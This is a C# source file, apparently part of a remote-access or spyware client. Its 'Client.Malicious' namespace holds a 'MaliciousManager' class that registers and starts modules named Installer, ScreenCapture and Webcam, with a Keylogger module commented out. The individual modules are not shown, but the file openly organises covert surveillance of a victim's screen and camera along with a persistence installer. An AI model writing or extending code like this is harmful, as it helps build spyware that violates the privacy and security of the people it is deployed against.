using System.Collections.Generic;
using ManagerAssistance.Common;

namespace ManagerAssistance.Client.Malicious
{
    public sealed class MaliciousManager : Singleton<MaliciousManager>
    {

        private readonly List<IMalicious> m_malicious;


        public MaliciousManager()
        {
            m_malicious = new List<IMalicious>
            {
                Installer.Instance,
                //Keylogger.Instance,
                ScreenCapture.Instance,
                Webcam.Instance
            };
        }


        public void Initialize()
        {
            m_malicious.ForEach(malicious => malicious.Initialize());
        }
    }
}
